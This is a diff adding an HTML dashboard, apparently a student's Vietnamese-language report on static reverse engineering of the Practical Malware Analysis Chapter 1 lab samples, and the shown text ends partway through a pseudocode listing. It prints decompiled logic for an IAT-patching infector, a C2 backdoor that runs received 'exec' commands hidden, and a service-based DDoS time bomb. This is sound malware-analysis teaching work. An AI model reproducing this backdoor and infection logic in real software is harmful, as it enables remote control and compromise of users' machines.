@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="vi" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PMA Chapter 1 Reverse Engineering Dashboard | IAM302 FPT University</title>
+  
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- Stylesheet -->
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <!-- ==========================================================================
+       TOP EXECUTIVE HEADER
+       ========================================================================== -->
+  <header class="site-header">
+    <div class="container header-inner">
+      <div class="brand-wrapper">
+        <div class="pulse-indicator" title="Môi trường Sandbox phân tích cô lập (Isolated Lab)"></div>
+        <div>
+          <div class="brand-title">
+            <span>PMA CHAPTER 1 REVERSE ENGINEERING</span>
+            <span class="badge-lab">IAM302</span>
+            <span class="badge-rea">REA METHOD</span>
+          </div>
+          <div class="header-meta">
+            Báo cáo Chuyên sâu Phân tích Dịch ngược Mã độc | Sinh viên thực hiện: <strong class="student-name">Huỳnh Ngọc Hiếu</strong> (Đại học FPT)
+          </div>
+        </div>
+      </div>
+
+      <div class="header-actions">
+        <button class="btn btn-secondary" onclick="toggleTheme()" id="theme-btn" title="Chuyển đổi giao diện Sáng / Tối">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+          Giao Diện Sáng
+        </button>
+        <button class="btn btn-primary" onclick="copyAllIOCs()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+          Sao Chép IOCs
+        </button>
+        <button class="btn btn-accent" onclick="document.querySelector('[data-tab=\'presentation\']').click()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+          Phòng Quay Video
+        </button>
+        <button class="btn btn-secondary" onclick="window.print()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 6 2 18 2 18 9"></polyline><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><rect x="6" y="14" width="12" height="8"></rect></svg>
+          In PDF
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- ==========================================================================
+       TABS NAVIGATION
+       ========================================================================== -->
+  <nav class="tabs-nav">
+    <div class="container tabs-container">
+      <button class="tab-btn active" data-tab="overview">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+        Tổng Quan & Khung REA
+      </button>
+      <button class="tab-btn" data-tab="deepdive">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+        Phòng Dịch Ngược 4 Labs
+        <span class="badge-pill">4 Labs</span>
+      </button>
+      <button class="tab-btn" data-tab="iocs">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        Bảng Chỉ Số IOCs
+        <span class="badge-pill">22 Mục</span>
+      </button>
+      <button class="tab-btn" data-tab="mitre">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="22" y1="12" x2="18" y2="12"></line><line x1="6" y1="12" x2="2" y2="12"></line><line x1="12" y1="6" x2="12" y2="2"></line><line x1="12" y1="22" x2="12" y2="18"></line></svg>
+        Ma Trận MITRE ATT&CK
+      </button>
+      <button class="tab-btn" data-tab="presentation">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+        Kịch Bản Quay Video
+        <span class="badge-pill" style="background:#f43f5e; color:#fff;">Teleprompter</span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- ==========================================================================
+       MAIN CONTENT
+       ========================================================================== -->
+  <main class="container">
+
+    <!-- ========================================================================
+         TAB 1: TỔNG QUAN & KHUNG PHƯƠNG PHÁP LUẬN REA
+         ======================================================================== -->
+    <section id="tab-overview" class="tab-content active">
+      
+      <!-- Metrics Row -->
+      <div class="metrics-row">
+        <div class="metric-box cyan">
+          <span class="metric-box-title">Mẫu Nhị Phân Phân Tích</span>
+          <span class="metric-box-value">5 PE + 1 Payload</span>
+          <span class="metric-box-sub">Lab 01-01 đến Lab 01-04</span>
+        </div>
+        <div class="metric-box emerald">
+          <span class="metric-box-title">Tiêu Chuẩn Chuẩn Hóa</span>
+          <span class="metric-box-value">morluto/rea</span>
+          <span class="metric-box-sub">Triệt tiêu giả định (Anti-hallucination)</span>
+        </div>
+        <div class="metric-box amber">
+          <span class="metric-box-title">Đóng Gói Chống Phân Tích</span>
+          <span class="metric-box-value">UPX & FSG</span>
+          <span class="metric-box-sub">Tỷ lệ nén 18.75% (UPX 3.04) & aPLib</span>
+        </div>
+        <div class="metric-box rose">
+          <span class="metric-box-title">Kỹ Thuật Xâm Nhập Đỉnh Cao</span>
+          <span class="metric-box-value">Tắt WFP & Inject</span>
+          <span class="metric-box-sub">winlogon.exe & kerne132.dll Typosquatting</span>
+        </div>
+      </div>
+
+      <!-- Executive Overview Card -->
+      <div class="card">
+        <div class="card-header">
+          <div>
+            <h2 class="card-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path></svg>
+              Hệ Thống Mẫu Phân Tích Thực Nghiệm (Practical Malware Analysis - Chapter 1)
+            </h2>
+            <div class="card-subtitle">Phân tích dịch ngược tĩnh (Static Analysis) kết hợp Decompiler IDA Pro Hex-Rays qua giao thức MCP</div>
+          </div>
+          <span class="badge-tag path">PracticalMalwareAnalysis-Labs\BinaryCollection\Chapter_1L</span>
+        </div>
+
+        <div class="table-responsive">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>STT</th>
+                <th>Tên Tệp</th>
+                <th>Kích Thước</th>
+                <th>Định Dạng</th>
+                <th>Packer / Obfuscation</th>
+                <th>Phân Loại Mã Độc</th>
+                <th>Mục Đích & Hành Vi Cốt Lõi</th>
+                <th>Thao Tác</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Lab 01-01</strong></td>
+                <td><code>Lab01-01.exe</code></td>
+                <td>16,384 B</td>
+                <td>PE32 x86 GUI</td>
+                <td><span class="badge-tag mtx">Unpacked</span></td>
+                <td>PE Infector / DLL Hijacker</td>
+                <td>Sửa đổi bảng Import (IAT) của mọi file <code>.exe</code> trên <code>C:\</code> trỏ sang <code>kerne132.dll</code>.</td>
+                <td><button class="copy-mini-btn" onclick="jumpToLab('lab01-01')">Xem Lab 1</button></td>
+              </tr>
+              <tr>
+                <td></td>
+                <td><code>Lab01-01.dll</code></td>
+                <td>163,840 B</td>
+                <td>PE32 x86 DLL</td>
+                <td><span class="badge-tag mtx">Unpacked</span></td>
+                <td>C2 Backdoor / Remote Shell</td>
+                <td>Kết nối C2 <code>127.26.152.13:80</code>, nhận lệnh <code>exec</code> chạy ẩn lệnh hệ thống, Mutex <code>SADFHUHF</code>.</td>
+                <td><button class="copy-mini-btn" onclick="jumpToLab('lab01-01')">Xem Lab 1</button></td>
+              </tr>
+              <tr>
+                <td><strong>Lab 01-02</strong></td>
+                <td><code>Lab01-02.exe</code></td>
+                <td>3,072 B</td>
+                <td>PE32 x86 GUI</td>
+                <td><span class="badge-tag path">UPX 3.04</span></td>
+                <td>HTTP Flooder / DDoS Bot</td>
+                <td>Cài đặt Service <code>MalService</code>, Timer kích hoạt năm 2100, tạo 20 luồng flood <code>malwareanalysisbook.com</code>.</td>
+                <td><button class="copy-mini-btn" onclick="jumpToLab('lab01-02')">Xem Lab 2</button></td>
+              </tr>
+              <tr>
+                <td><strong>Lab 01-03</strong></td>
+                <td><code>Lab01-03.exe</code></td>
+                <td>4,752 B</td>
+                <td>PE32 x86 GUI</td>
+                <td><span class="badge-tag path">FSG 1.0 / 1.33</span></td>
+                <td>Obfuscated Downloader</td>
+                <td>Minh chứng giới hạn của phân tích tĩnh: nén bằng thuật toán aPLib, xóa IAT, OEP tại <code>0x00401090</code>.</td>
+                <td><button class="copy-mini-btn" onclick="jumpToLab('lab01-03')">Xem Lab 3</button></td>
+              </tr>
+              <tr>
+                <td><strong>Lab 01-04</strong></td>
+                <td><code>Lab01-04.exe</code></td>
+                <td>36,864 B</td>
+                <td>PE32 x86 GUI</td>
+                <td><span class="badge-tag mtx">Unpacked</span></td>
+                <td>Trojan Dropper / Injector</td>
+                <td>Leo thang <code>SeDebugPrivilege</code>, inject <code>winlogon.exe</code> gọi <code>sfc_os.dll #2</code> tắt WFP, trích xuất Resource #101.</td>
+                <td><button class="copy-mini-btn" onclick="jumpToLab('lab01-04')">Xem Lab 4</button></td>
+              </tr>
+              <tr>
+                <td><em>(Nhúng)</em></td>
+                <td><em>Resource #101</em></td>
+                <td>20,384 B</td>
+                <td>PE32 x86 GUI</td>
+                <td><span class="badge-tag mtx">Unpacked</span></td>
+                <td>Trojan Downloader</td>
+                <td>Chạy mồi <code>winup.exe</code> trong %TEMP%, tải payload từ <code>practicalmalwareanalysis.com/updater.exe</code> về <code>wupdmgrd.exe</code>.</td>
+                <td><button class="copy-mini-btn" onclick="jumpToLab('lab01-04')">Xem Lab 4</button></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- REA Methodology Quad Grid -->
+      <div class="card">
+        <div class="card-header">
+          <div>
+            <h2 class="card-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+              Khung Phương Pháp Luận Chuẩn Hóa REA (Reverse Engineer Anything)
+            </h2>
+            <div class="card-subtitle">4 cấp độ chứng cứ phân định minh bạch để triệt tiêu giả định và phỏng đoán vô căn cứ</div>
+          </div>
+          <span class="badge-tag svc">morluto/rea Standard</span>
+        </div>
+
+        <div class="rea-grid">
+          <div class="rea-card obs">
+            <div class="rea-card-header">
+              <span class="rea-card-title">1. Observations (Quan Sát)</span>
+              <span class="badge-tag mtx">Bất Biến</span>
+            </div>
+            <div class="rea-card-body">
+              Các thông số vật lý & nhị phân trích xuất trực tiếp từ file PE:
+              <ul>
+                <li><strong>Byte Offsets & Hashes</strong>: MD5, SHA-256 đã kiểm chứng.</li>
+                <li><strong>Entropy Phân Đoạn</strong>: UPX0 (0.00), seg000 (0.00), .text (4.45).</li>
+                <li><strong>Bảng Imports & Exports</strong>: API gốc được hệ điều hành liên kết.</li>
+                <li><strong>Visible Strings</strong>: Các chuỗi ASCII/Unicode nguyên bản trong nhị phân.</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="rea-card deriv">
+            <div class="rea-card-header">
+              <span class="rea-card-title">2. Derivations (Suy Diễn)</span>
+              <span class="badge-tag hash">Kiến Trúc</span>
+            </div>
+            <div class="rea-card-body">
+              Các cấu trúc logic chứng minh qua luồng luân chuyển mã thực thi:
+              <ul>
+                <li><strong>OEP Discovery</strong>: Nhận diện điểm vào gốc sau vòng lặp giải nén (UPX jump, FSG aPLib JUMPOUT).</li>
+                <li><strong>Export Forwarding</strong>: Cơ chế DLL Proxying trong <code>Lab01-01.dll</code> chuyển tiếp API sang <code>Kernel32.dll</code>.</li>
+                <li><strong>Resource Extraction</strong>: Cấu trúc PE Header định vị Resource #101 tại offset <code>0x4060</code>.</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="rea-card inf">
+            <div class="rea-card-header">
+              <span class="rea-card-title">3. Inferences (Đánh Giá)</span>
+              <span class="badge-tag net">Hành Vi</span>
+            </div>
+            <div class="rea-card-body">
+              Ý đồ chiến thuật và ánh xạ vào khung chuẩn MITRE ATT&CK:
+              <ul>
+                <li><strong>DLL Hijacking / Typosquatting</strong>: Thay thế chữ <code>l</code> bằng số <code>1</code> (<code>kerne132.dll</code>) để duy trì hiện diện (T1574.001).</li>
+                <li><strong>Time-bomb Flooder</strong>: Đặt lịch năm 2100 để né Sandbox phân tích tự động thời gian ngắn.</li>
+                <li><strong>Defense Evasion</strong>: Gọi hàm ẩn Ordinal #2 trong <code>sfc_os.dll</code> để vô hiệu hóa Windows File Protection.</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="rea-card unk">
+            <div class="rea-card-header">
+              <span class="rea-card-title">4. Unknowns (Giới Hạn)</span>
+              <span class="badge-tag path">Phân Tích Tĩnh</span>
+            </div>
+            <div class="rea-card-body">
+              Những dữ kiện chưa thể khẳng định chỉ bằng phân tích tĩnh đơn thuần:
+              <ul>
+                <li><strong>Phản hồi máy chủ C2</strong>: Tập lệnh thực tế máy chủ <code>127.26.152.13</code> gửi về ngoài <code>sleep</code>/<code>exec</code>.</li>
+                <li><strong>Nội dung tải về của updater.exe</strong>: Giai đoạn 2 của Lab 01-04 phụ thuộc vào phản hồi của máy chủ từ xa.</li>
+                <li><strong>Payload của Lab 01-03</strong>: Cần kết hợp Dynamic Analysis (x64dbg / Scylla dump) để trích xuất toàn vẹn.</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================================
+         TAB 2: PHÒNG DỊCH NGƯỢC 4 LABS (LAB 01-01 -> 01-04)
+         ======================================================================== -->
+    <section id="tab-deepdive" class="tab-content">
+      
+      <!-- Sub-tabs Navigation Bar -->
+      <div class="subtabs-bar">
+        <button class="subtab-btn active" data-subtab="lab01-01">Lab 01-01: PE Infector & C2 Backdoor</button>
+        <button class="subtab-btn" data-subtab="lab01-02">Lab 01-02: UPX Packer & DDoS Time-bomb</button>
+        <button class="subtab-btn" data-subtab="lab01-03">Lab 01-03: FSG Packer & Ranh Giới Tĩnh</button>
+        <button class="subtab-btn" data-subtab="lab01-04">Lab 01-04: Process Injector & Tắt WFP</button>
+      </div>
+
+      <!-- SUBTAB CONTENT: LAB 01-01 -->
+      <div id="lab01-01" class="subtab-content active">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <h2 class="card-title">
+                <span class="badge-tag path">Lab 01-01</span>
+                Kỹ Thuật DLL Hijacking qua Sửa Đổi IAT & C2 Backdoor Typosquatting
+              </h2>
+              <div class="card-subtitle">Mục tiêu: <code>Lab01-01.exe</code> (PE Infector) & <code>Lab01-01.dll</code> (C2 Backdoor)</div>
+            </div>
+            <div>
+              <button class="btn btn-secondary copy-code-btn" data-code-target="code-lab1-exe">Sao Chép Mã Hex-Rays</button>
+            </div>
+          </div>
+
+          <!-- Section Entropy Visualizer -->
+          <div class="entropy-meter-wrap">
+            <div style="font-weight: 700; font-size: 0.85rem; margin-bottom: 12px; color: var(--text-main);">
+              Đo Độ Hỗn Loạn Phân Đoạn (Section Entropy) - Không Bị Đóng Gói (Unpacked)
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">.text</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 55%;"></div></div>
+              <span class="entropy-val">4.45 / 8.0</span>
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">.rdata</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 13%;"></div></div>
+              <span class="entropy-val">1.05 / 8.0</span>
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">.data</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 6%;"></div></div>
+              <span class="entropy-val">0.44 / 8.0</span>
+            </div>
+          </div>
+
+          <!-- Flowchart Steps -->
+          <div style="margin: 20px 0;">
+            <div style="font-weight: 700; font-size: 0.95rem; margin-bottom: 12px; color: var(--text-main);">
+              Luồng Tấn Công Trực Quan (Execution Flow Diagram)
+            </div>
+            <div class="flow-step-box">
+              <div class="flow-node warning">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag hash">Bước 1</span> Khởi chạy & Kiểm tra Khóa Dòng Lệnh
+                  </div>
+                  <div class="flow-node-desc">Kiểm tra <code>argv[1] == "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"</code>. Nếu thiếu cờ, chương trình thoát êm để qua mặt sandbox quét tự động.</div>
+                </div>
+                <span class="flow-node-tag">sub_401440</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node danger">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag path">Bước 2</span> Cấu Hình DLL Proxying & Thả File kerne132.dll
+                  </div>
+                  <div class="flow-node-desc">Ánh xạ <code>Kernel32.dll</code> thật vào bộ nhớ, thiết lập bảng xuất khẩu ủy quyền trong <code>Lab01-01.dll</code> và sao chép vào <code>C:\windows\system32\kerne132.dll</code> (Typosquatting số 1).</div>
+                </div>
+                <span class="flow-node-tag">CopyFileA</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node purple">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag svc">Bước 3</span> Lây Nhiễm Bảng Import (IAT Patching) Toàn Ổ C:\
+                  </div>
+                  <div class="flow-node-desc">Duyệt đệ quy <code>C:\*</code>, mở các file PE <code>.exe</code>, tìm chuỗi <code>"kernel32.dll"</code> trong IAT và ghi đè thành <code>"kerne132.dll"</code>.</div>
+                </div>
+                <span class="flow-node-tag">sub_4010A0</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node success">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag net">Bước 4</span> Kích Hoạt Backdoor Lắng Nghe Lệnh C2
+                  </div>
+                  <div class="flow-node-desc">Bất kỳ phần mềm nào mở lên sẽ nạp <code>kerne132.dll</code>. <code>DllMain</code> tạo Mutex <code>SADFHUHF</code>, nối C2 <code>127.26.152.13:80</code>, gửi beacon <code>hello</code> và thực thi lệnh <code>exec</code>.</div>
+                </div>
+                <span class="flow-node-tag">127.26.152.13:80</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hex-Rays Pseudocode Viewers -->
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 16px;">
+            <div class="code-viewer">
+              <div class="code-viewer-header">
+                <span class="code-viewer-title">Lab01-01.exe - Hàm main (0x00401440)</span>
+                <span class="badge-tag hash">IDA Hex-Rays</span>
+              </div>
+              <pre class="code-viewer-pre" id="code-lab1-exe"><code><span class="c-type">int</span> __cdecl <span class="c-func">main</span>(<span class="c-type">int</span> argc, <span class="c-type">const char</span> **argv)
+{
+  <span class="c-comm">// 1. Khóa an toàn ngăn nổ máy tự do</span>
+  <span class="c-kw">if</span> ( argc == <span class="c-num">2</span> &amp;&amp; <span class="c-func">strcmp</span>(argv[<span class="c-num">1</span>], <span class="c-str">"WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"</span>) == <span class="c-num">0</span> )
+  {
+    <span class="c-comm">// 2. Map Kernel32 thật và Lab01-01.dll vào RAM</span>
+    hObject = <span class="c-func">CreateFileA</span>(<span class="c-str">"C:\\Windows\\System32\\Kernel32.dll"</span>, GENERIC_READ, ...);
+    FileA = <span class="c-func">CreateFileA</span>(<span class="c-str">"Lab01-01.dll"</span>, GENERIC_READ | GENERIC_WRITE, ...);
+
+    <span class="c-comm">// 3. Thiết lập Forwarding ủy nhiệm hàm</span>
+    <span class="c-func">sub_4011E0</span>(FileA, hObject);
+
+    <span class="c-comm">// 4. Thả DLL ngụy trang Typosquatting</span>
+    <span class="c-func">CopyFileA</span>(<span class="c-str">"Lab01-01.dll"</span>, <span class="c-str">"C:\\windows\\system32\\kerne132.dll"</span>, FALSE);
+
+    <span class="c-comm">// 5. Duyệt đệ quy lây nhiễm toàn bộ file .exe ổ C</span>
+    <span class="c-func">sub_4011E0</span>(<span class="c-str">"C:\\*"</span>, <span class="c-num">0</span>);
+  }
+  <span class="c-kw">return</span> <span class="c-num">0</span>;
+}</code></pre>
+            </div>
+
+            <div class="code-viewer">
+              <div class="code-viewer-header">
+                <span class="code-viewer-title">Lab01-01.dll - Hàm DllMain (0x10001010)</span>
+                <span class="badge-tag hash">IDA Hex-Rays</span>
+              </div>
+              <pre class="code-viewer-pre" id="code-lab1-dll"><code><span class="c-type">BOOL</span> __stdcall <span class="c-func">DllMain</span>(<span class="c-type">HINSTANCE</span> hinst, <span class="c-type">DWORD</span> fdwReason, <span class="c-type">LPVOID</span> lpReserved)
+{
+  <span class="c-kw">if</span> ( fdwReason == DLL_PROCESS_ATTACH )
+  {
+    <span class="c-comm">// Kiểm tra Mutex phòng ngừa chạy trùng lặp</span>
+    <span class="c-kw">if</span> ( <span class="c-func">OpenMutexA</span>(MUTEX_ALL_ACCESS, FALSE, <span class="c-str">"SADFHUHF"</span>) == NULL )
+    {
+      <span class="c-func">CreateMutexA</span>(NULL, FALSE, <span class="c-str">"SADFHUHF"</span>);
+      <span class="c-func">WSAStartup</span>(<span class="c-num">0x202</span>, &amp;WSAData);
+      v3 = <span class="c-func">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+      name.sin_addr.s_addr = <span class="c-func">inet_addr</span>(<span class="c-str">"127.26.152.13"</span>);
+      name.sin_port = <span class="c-func">htons</span>(<span class="c-num">80</span>);
+
+      <span class="c-kw">if</span> ( <span class="c-func">connect</span>(v3, &amp;name, <span class="c-num">16</span>) != -<span class="c-num">1</span> )
+      {
+        <span class="c-kw">while</span> ( <span class="c-num">1</span> ) {
+          <span class="c-func">send</span>(v3, <span class="c-str">"hello"</span>, <span class="c-num">5</span>, <span class="c-num">0</span>);
+          <span class="c-func">recv</span>(v3, buf, <span class="c-num">4096</span>, <span class="c-num">0</span>);
+          <span class="c-kw">if</span> ( <span class="c-func">strncmp</span>(<span class="c-str">"sleep"</span>, buf, <span class="c-num">5</span>) == <span class="c-num">0</span> ) <span class="c-func">Sleep</span>(<span class="c-num">60000</span>);
+          <span class="c-kw">else if</span> ( <span class="c-func">strncmp</span>(<span class="c-str">"exec "</span>, buf, <span class="c-num">4</span>) == <span class="c-num">0</span> )
+            <span class="c-func">CreateProcessA</span>(NULL, &amp;buf[<span class="c-num">5</span>], ..., CREATE_NO_WINDOW, ...);
+          <span class="c-kw">else if</span> ( buf[<span class="c-num">0</span>] == <span class="c-str">'q'</span> ) <span class="c-kw">break</span>;
+        }
+      }
+    }
+  }
+  <span class="c-kw">return</span> TRUE;
+}</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SUBTAB CONTENT: LAB 01-02 -->
+      <div id="lab01-02" class="subtab-content">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <h2 class="card-title">
+                <span class="badge-tag path">Lab 01-02</span>
+                Mã Độc Đóng Gói UPX, Windows Service & Botnet DDoS Hẹn Giờ Năm 2100
+              </h2>
+              <div class="card-subtitle">Mục tiêu: <code>Lab01-02.exe</code> (Packed: 3,072 B -> Unpacked: 16,384 B)</div>
+            </div>
+            <div>
+              <button class="btn btn-secondary copy-code-btn" data-code-target="code-lab2-service">Sao Chép Mã Hex-Rays</button>
+            </div>
+          </div>
+
+          <!-- Section Entropy Visualizer Before/After Unpack -->
+          <div class="entropy-meter-wrap">
+            <div style="font-weight: 700; font-size: 0.85rem; margin-bottom: 12px; color: var(--text-main);">
+              So Sánh Cấu Trúc Phân Đoạn & Entropy (Trước vs Sau khi Unpack UPX 3.04)
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">UPX0 (Packed)</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 1%;"></div></div>
+              <span class="entropy-val">0.00 (Vùng trống ảo 16KB)</span>
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">UPX1 (Packed)</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill warn" style="width: 44%;"></div></div>
+              <span class="entropy-val">3.53 / 8.0</span>
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">.text (Unpacked)</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 53%;"></div></div>
+              <span class="entropy-val">4.21 / 8.0 (Đã phục hồi IAT)</span>
+            </div>
+          </div>
+
+          <!-- Flowchart Steps -->
+          <div style="margin: 20px 0;">
+            <div style="font-weight: 700; font-size: 0.95rem; margin-bottom: 12px; color: var(--text-main);">
+              Luồng Hoạt Động & Cơ Chế Time-Bomb Của MalService
+            </div>
+            <div class="flow-step-box">
+              <div class="flow-node purple">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag hash">Bước 1</span> Giải Nén UPX & Nhảy Tới OEP
+                  </div>
+                  <div class="flow-node-desc">Thực hiện lệnh <code>upx -d Lab01-02.exe -o Lab01-02_unpacked.exe</code>. Tệp khôi phục các API <code>CreateServiceA</code>, <code>InternetOpenUrlA</code>, <code>SetWaitableTimer</code>.</div>
+                </div>
+                <span class="flow-node-tag">OEP: 0x00401190</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node success">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag svc">Bước 2</span> Kiểm Tra Mutex & Cài Đặt Windows Service Tự Chạy
+                  </div>
+                  <div class="flow-node-desc">Mở Mutex <code>HGL345</code>. Mở Service Control Manager, tạo Windows Service <code>MalService</code> với chế độ <code>SERVICE_AUTO_START</code>.</div>
+                </div>
+                <span class="flow-node-tag">CreateServiceA</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node warning">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag net">Bước 3</span> Đặt Bom Hẹn Giờ Đến Năm 2100 (Time-Bomb Trigger)
+                  </div>
+                  <div class="flow-node-desc">Thiết lập cấu trúc <code>SystemTime.wYear = 2100</code>, kích hoạt <code>CreateWaitableTimerA</code> và chờ đợi vô hạn bằng <code>WaitForSingleObject</code>.</div>
+                </div>
+                <span class="flow-node-tag">Year 2100</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node danger">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag path">Bước 4</span> Tạo 20 Threads Tấn Công HTTP Flooder Làm Sập Máy Chủ
+                  </div>
+                  <div class="flow-node-desc">Đến thời điểm hẹn, sinh 20 luồng đồng thời, lặp vô tận gửi HTTP GET requests tới <code>http://www.malwareanalysisbook.com</code> giả lập User-Agent <code>Internet Explorer 8.0</code>.</div>
+                </div>
+                <span class="flow-node-tag">20 Threads</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hex-Rays Pseudocode Viewers -->
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 16px;">
+            <div class="code-viewer">
+              <div class="code-viewer-header">
+                <span class="code-viewer-title">Lab01-02.exe - Hàm sub_401040 (Service & Time-Bomb)</span>
+                <span class="badge-tag hash">IDA Hex-Rays</span>
+              </div>
+              <pre class="code-viewer-pre" id="code-lab2-service"><code><span class="c-type">int</span> <span class="c-func">sub_401040</span>()
+{
+  <span class="c-comm">// 1. Kiểm tra đơn phiên qua Mutex</span>
+  <span class="c-kw">if</span> ( <span class="c-func">OpenMutexA</span>(MUTEX_ALL_ACCESS, FALSE, <span class="c-str">"HGL345"</span>) != NULL )
+    <span class="c-func">ExitProcess</span>(<span class="c-num">0</span>);
+  <span class="c-func">CreateMutexA</span>(NULL, FALSE, <span class="c-str">"HGL345"</span>);
+
+  <span class="c-comm">// 2. Đăng ký Windows Service tự khởi động</span>
+  v0 = <span class="c-func">OpenSCManagerA</span>(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+  <span class="c-func">CreateServiceA</span>(v0, <span class="c-str">"MalService"</span>, <span class="c-str">"Malservice"</span>, ..., SERVICE_AUTO_START, ...);
+
+  <span class="c-comm">// 3. Kích hoạt hẹn giờ đến năm 2100!</span>
+  <span class="c-func">memset</span>(&amp;SystemTime.wMonth, <span class="c-num">0</span>, <span class="c-num">14</span>);
+  SystemTime.wYear = <span class="c-num">2100</span>;
